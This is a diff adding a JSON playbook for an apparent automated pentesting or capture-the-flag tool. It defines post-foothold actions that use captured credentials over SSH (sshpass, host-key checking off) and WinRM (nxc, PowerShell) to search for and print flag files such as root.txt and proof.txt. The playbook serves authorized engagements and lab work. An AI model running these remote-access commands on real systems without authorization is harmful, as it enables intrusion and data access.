@@ -1,0 +1,67 @@
+{
+  "name": "obol_flag_hunt_2026_09",
+  "description": "Thorough post-foothold flag capture. Reads well-known flag files through the existing SSH/WinRM proof channel and records what it actually reads. Not Orange-derived.",
+  "source": {
+    "name": "O.B.O.L flag capture methodology",
+    "license": "project",
+    "notes": "Runs a single non-interactive recursive search per OS over an existing proven foothold; a captured flag is proof, not a checkbox."
+  },
+  "actions": [
+    {
+      "id": "flag-hunt-linux",
+      "title": "Hunt for flags (Linux)",
+      "tool": "sshpass",
+      "priority": 82,
+      "requires_all": [
+        "credential.available",
+        "foothold.linux"
+      ],
+      "os": [
+        "linux"
+      ],
+      "produces": [
+        "objective.flag"
+      ],
+      "hypothesis": "A Linux foothold should be able to read the engagement flag files; capturing their contents proves the objective.",
+      "report": {
+        "finding": "Captured a flag file from the Linux foothold.",
+        "severity": "high"
+      },
+      "commands": [
+        {
+          "tool": "sshpass",
+          "note": "Thoroughly search the filesystem for the well-known flag files and print each as path:content over the existing non-interactive SSH channel.",
+          "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {{user}}@{{target}} find / -xdev -type f -size -4k \\( -iname user.txt -o -iname root.txt -o -iname local.txt -o -iname proof.txt -o -iname flag.txt -o -iname flag \\) -exec grep -H -s . {} +"
+        }
+      ]
+    },
+    {
+      "id": "flag-hunt-windows",
+      "title": "Hunt for flags (Windows)",
+      "tool": "nxc",
+      "priority": 82,
+      "requires_all": [
+        "credential.available",
+        "winrm.authenticated"
+      ],
+      "os": [
+        "windows"
+      ],
+      "produces": [
+        "objective.flag"
+      ],
+      "hypothesis": "A Windows WinRM foothold should be able to read the engagement flag files; capturing their contents proves the objective.",
+      "report": {
+        "finding": "Captured a flag file from the Windows foothold.",
+        "severity": "high"
+      },
+      "commands": [
+        {
+          "tool": "nxc",
+          "note": "Recursively search user profiles for the well-known flag files and print each as ===FLAG:path::content through WinRM PowerShell so output is captured and parsed like every other run.",
+          "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -X \"foreach($f in Get-ChildItem -Path C:\\Users -Recurse -Force -Include user.txt,root.txt,proof.txt,local.txt,flag.txt -File -ErrorAction SilentlyContinue){Write-Output ('===FLAG:'+$f.FullName+'::'+(Get-Content -Raw -LiteralPath $f.FullName -ErrorAction SilentlyContinue))}\""
+        }
+      ]
+    }
+  ]
+}
